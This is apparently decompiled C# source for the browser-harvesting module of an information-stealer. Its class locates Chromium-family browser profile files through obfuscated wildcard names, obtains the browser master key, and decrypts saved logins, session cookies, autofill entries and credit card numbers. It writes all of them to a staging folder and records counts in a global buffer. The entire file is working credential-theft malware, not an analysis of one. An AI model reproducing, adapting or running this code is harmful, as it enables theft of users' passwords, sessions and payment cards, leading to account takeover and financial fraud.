using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Web;
using EntryLoader;

// Token: 0x02000007 RID: 7
internal class EGChromeC
{
	// Token: 0x0600000B RID: 11 RVA: 0x000024FC File Offset: 0x000006FC
	public static void Start()
	{
		string[] search_files = new string[]
		{
			"co*es",
			"log*ta",
			"we*ata",
			"loc*ate"
		};
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		Recursive.Search(global::Buffer.path_lad, ref list, global::Buffer.string_0, search_files, 3, 0, false);
		Recursive.Search(global::Buffer.path_ad, ref list2, global::Buffer.string_0, search_files, 3, 0, false);
		List<string> list3 = (list.Count<string>() > 1 && list2.Count<string>() > 1) ? list.Concat(list2).ToList<string>() : ((list.Count<string>() > 1) ? list : ((list2.Count<string>() > 1) ? list2 : null));
		bool flag = false;
		string text = "";
		int num = 0;
		int num2 = 0;
		if (!Directory.Exists(string.Format("{0}Browsers", global::Buffer.path_l)))
		{
			Directory.CreateDirectory(string.Format("{0}Browsers", global::Buffer.path_l));
		}
		if (list3 != null)
		{
			foreach (string text2 in list3)
			{
				string text3 = Path.GetFileName(text2).ToLower();
				if (!flag && text3.Contains("state"))
				{
					EGChromeC.chrome.GETMasterKey(text2);
					flag = true;
				}
				else if (text3.Contains("login"))
				{
					string text4 = EGChromeC.PasswordParse(text2);
					text += (string.IsNullOrEmpty(text4) ? "" : string.Format("{0}\n\n", text4.Trim()));
				}
				else if (text3.Contains("cookie"))
				{
					num++;
					EGChromeC.CookieParse(text2, string.Format("{0}Browsers\\[{1}-{2}] Cookies.txt", global::Buffer.path_l, text2.Split(new string[]
					{
						"AppData\\"
					}, StringSplitOptions.None)[1].Split(new char[]
					{
						'\\'
					})[1], num));
				}
				else if (text3.Contains("web"))
				{
					num2++;
					EGChromeC.fillParse(text2, string.Format("{0}Browsers\\[{1}-{2}] Autofill.txt", global::Buffer.path_l, text2.Split(new string[]
					{
						"AppData\\"
					}, StringSplitOptions.None)[1].Split(new char[]
					{
						'\\'
					})[1], num2));
					EGChromeC.CCParse(text2, string.Format("{0}Browsers\\[{1}-{2}] Cards.txt", global::Buffer.path_l, text2.Split(new string[]
					{
						"AppData\\"
					}, StringSplitOptions.None)[1].Split(new char[]
					{
						'\\'
					})[1], num2));
				}
			}
		}
		if (!string.IsNullOrEmpty(text.Trim()))
		{
			File.WriteAllText(string.Format("{0}Browsers\\Passwords.txt", global::Buffer.path_l), text.Trim().Replace("\n", Environment.NewLine));
		}
		global::Buffer.XBufferData[0] = EGChromeC.CCookies.ToString();
		global::Buffer.XBufferData[1] = EGChromeC.CPasswords.ToString();
		global::Buffer.XBufferData[10] = EGChromeC.cfill.ToString();
		global::Buffer.XBufferData[11] = EGChromeC.CCards.ToString();
	}

	// Token: 0x0600000C RID: 12 RVA: 0x0000282C File Offset: 0x00000A2C
	protected static void CCParse(string path, string save)
	{
		try
		{
			if (File.Exists(path))
			{
				string text = string.Format("{0}{1}", global::Buffer.path_t, GetRandom.String(null, -1));
				if (File.Exists(text))
				{
					File.Delete(text);
				}
				try
				{
					File.Copy(path, text, true);
				}
				catch
				{
					try
					{
						text = string.Format("{0}{1}", global::Buffer.path_ds, GetRandom.String(null, -1));
						if (File.Exists(text))
						{
							File.Delete(text);
						}
						File.Copy(path, text, true);
					}
					catch
					{
						return;
					}
				}
				string text2 = "";
				if (File.ReadAllLines(text).Length >= 75)
				{
					Sqlite sqlite = new Sqlite(text);
					sqlite.ReadTable("CC");
					int num = 0;
					try
					{
						num = sqlite.GetRowCount();
					}
					catch
					{
						return;
					}
					for (int i = 0; i < num; i++)
					{
						try
						{
							if (i >= 100 && string.IsNullOrEmpty(text2))
							{
								break;
							}
							if (!string.IsNullOrEmpty(sqlite.GetValue(i, 1)))
							{
								string text3 = null;
								try
								{
									text3 = EGChromeC.chrome.Decrypt(sqlite.GetValue(i, 12), false);
									if (string.IsNullOrEmpty(text3))
									{
										text3 = EGChromeC.chrome.Decrypt(sqlite.GetValue(i, 12), true);
									}
								}
								catch
								{
									goto IL_17C;
								}
								text2 += string.Format("\n\nНазвание: {0}.\nНомер: {1}.\nМесяц/Год: {2}/{3}.\nСчет: {4}.", new object[]
								{
									sqlite.GetValue(i, 1),
									text3,
									sqlite.GetValue(i, 2),
									sqlite.GetValue(i, 3),
									sqlite.GetValue(i, 9)
								});
								EGChromeC.CCards++;
							}
						}
						catch
						{
						}
						IL_17C:;
					}
					try
					{
						File.Delete(text);
					}
					catch
					{
					}
				}
				text2 = text2.Trim().Replace("\n", Environment.NewLine);
				if (!string.IsNullOrEmpty(text2))
				{
					File.WriteAllText(save, text2);
				}
			}
		}
		catch
		{
		}
	}

	// Token: 0x0600000D RID: 13 RVA: 0x00002AA8 File Offset: 0x00000CA8
	protected static void fillParse(string path, string save)
	{
		try
		{
			if (File.Exists(path))
			{
				string text = string.Format("{0}{1}", global::Buffer.path_t, GetRandom.String(null, -1));
				if (File.Exists(text))
				{
					File.Delete(text);
				}
				try
				{
					File.Copy(path, text, true);
				}
				catch
				{
					try
					{
						text = string.Format("{0}{1}", global::Buffer.path_ds, GetRandom.String(null, -1));
						if (File.Exists(text))
						{
							File.Delete(text);
						}
						File.Copy(path, text, true);
					}
					catch
					{
						return;
					}
				}
				string text2 = "";
				if (File.ReadAllLines(text).Length >= 75)
				{
					Sqlite sqlite = new Sqlite(text);
					sqlite.ReadTable("Autofill");
					int num = 0;
					try
					{
						num = sqlite.GetRowCount();
					}
					catch
					{
						return;
					}
					for (int i = 0; i < num; i++)
					{
						try
						{
							if (i >= 100 && string.IsNullOrEmpty(text2))
							{
								break;
							}
							if (!string.IsNullOrEmpty(sqlite.GetValue(i, 0)) && !string.IsNullOrEmpty(sqlite.GetValue(i, 1)))
							{
								text2 += string.Format("\n\n\nType: {0}\nValue: {1}", sqlite.GetValue(i, 0), Encoding.UTF8.GetString(Encoding.Default.GetBytes(sqlite.GetValue(i, 1))));
								EGChromeC.cfill++;
							}
						}
						catch
						{
						}
					}
					try
					{
						File.Delete(text);
					}
					catch
					{
					}
				}
				text2 = text2.Trim().Replace("\n", Environment.NewLine);
				if (!string.IsNullOrEmpty(text2))
				{
					File.WriteAllText(save, text2);
				}
			}
		}
		catch
		{
		}
	}

	// Token: 0x0600000E RID: 14 RVA: 0x00002CC0 File Offset: 0x00000EC0
	protected static string PasswordParse(string path)
	{
		string result;
		try
		{
			if (!File.Exists(path))
			{
				result = "";
			}
			else
			{
				string text = "";
				string text2 = string.Format("{0}{1}", global::Buffer.path_t, GetRandom.String(null, -1));
				if (File.Exists(text2))
				{
					File.Delete(text2);
				}
				try
				{
					File.Copy(path, text2, true);
				}
				catch
				{
					try
					{
						text2 = string.Format("{0}{1}", global::Buffer.path_ds, GetRandom.String(null, -1));
						if (File.Exists(text2))
						{
							File.Delete(text2);
						}
						File.Copy(path, text2, true);
					}
					catch
					{
						return null;
					}
				}
				if (File.ReadAllLines(text2).Length >= 37)
				{
					Sqlite sqlite = new Sqlite(text2);
					sqlite.ReadTable("logins");
					int num = 0;
					try
					{
						num = sqlite.GetRowCount();
					}
					catch
					{
						return "";
					}
					for (int i = 0; i < num; i++)
					{
						try
						{
							string value = sqlite.GetValue(i, 0);
							string value2 = sqlite.GetValue(i, 3);
							string text3 = null;
							try
							{
								text3 = EGChromeC.chrome.Decrypt(sqlite.GetValue(i, 5), false);
								if (string.IsNullOrEmpty(text3))
								{
									text3 = EGChromeC.chrome.Decrypt(sqlite.GetValue(i, 5), true);
								}
							}
							catch
							{
								goto IL_1A9;
							}
							if (!string.IsNullOrEmpty(value.Trim()) && !string.IsNullOrEmpty(value2.Trim()) && !string.IsNullOrEmpty(text3.Trim()))
							{
								text += "=====================================\n";
								text += string.Format("URL: {0}\n", value);
								text += string.Format("Login: {0}\n", value2);
								text += string.Format("Password: {0}\n", text3);
								text += "=====================================\n\n\n";
								EGChromeC.CPasswords++;
							}
						}
						catch
						{
						}
						IL_1A9:;
					}
					try
					{
						File.Delete(text2);
					}
					catch
					{
					}
					result = text.Replace("\n", Environment.NewLine).Trim();
				}
				else
				{
					result = "";
				}
			}
		}
		catch
		{
			result = "";
		}
		return result;
	}

	// Token: 0x0600000F RID: 15 RVA: 0x00002F68 File Offset: 0x00001168
	protected static void CookieParse(string path, string save)
	{
		try
		{
			if (File.Exists(path))
			{
				string text = string.Format("{0}{1}", global::Buffer.path_t, GetRandom.String(null, -1));
				if (File.Exists(text))
				{
					File.Delete(text);
				}
				try
				{
					File.Copy(path, text, true);
				}
				catch
				{
					try
					{
						text = string.Format("{0}{1}", global::Buffer.path_ds, GetRandom.String(null, -1));
						if (File.Exists(text))
						{
							File.Delete(text);
						}
						File.Copy(path, text, true);
					}
					catch
					{
						return;
					}
				}
				if (File.ReadAllLines(text).Length >= 21)
				{
					Sqlite sqlite = new Sqlite(text);
					sqlite.ReadTable("cookies");
					int num = 0;
					try
					{
						num = sqlite.GetRowCount();
					}
					catch
					{
						return;
					}
					string text2 = "";
					int num2 = (int)DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1)).TotalSeconds;
					int num3 = 31104000;
					for (int i = 0; i < num; i++)
					{
						try
						{
							string text3 = null;
							try
							{
								text3 = EGChromeC.chrome.Decrypt(sqlite.GetValue(i, 12), false);
								if (string.IsNullOrEmpty(text3))
								{
									text3 = EGChromeC.chrome.Decrypt(sqlite.GetValue(i, 12), true);
								}
							}
							catch
							{
								goto IL_1CC;
							}
							text2 += string.Format("{0}\tTRUE\t{1}\t{2}\t{3}\t{4}\t{5}{6}", new object[]
							{
								sqlite.GetValue(i, 1),
								sqlite.GetValue(i, 4),
								(sqlite.GetValue(i, 6) == "1") ? "TRUE" : "FALSE",
								num2 + num3,
								sqlite.GetValue(i, 2),
								HttpUtility.UrlDecode(text3).Contains("\"") ? text3 : HttpUtility.UrlDecode(text3),
								Environment.NewLine
							});
							EGChromeC.CCookies++;
						}
						catch
						{
						}
						IL_1CC:;
					}
					try
					{
						File.Delete(text);
					}
					catch
					{
					}
					if (!string.IsNullOrEmpty(text2))
					{
						File.WriteAllText(save, string.Format("# Netscape HTTP Cookie File{0}{1}", Environment.NewLine, text2.Trim()));
					}
				}
			}
		}
		catch
		{
		}
	}

	// Token: 0x04000001 RID: 1
	protected static Chrome chrome = EntryPoint.chrome;

	// Token: 0x04000002 RID: 2
	protected static int CCookies = 0;

	// Token: 0x04000003 RID: 3
	protected static int CPasswords = 0;

	// Token: 0x04000004 RID: 4
	protected static int cfill = 0;

	// Token: 0x04000005 RID: 5
	protected static int CCards = 0;
}
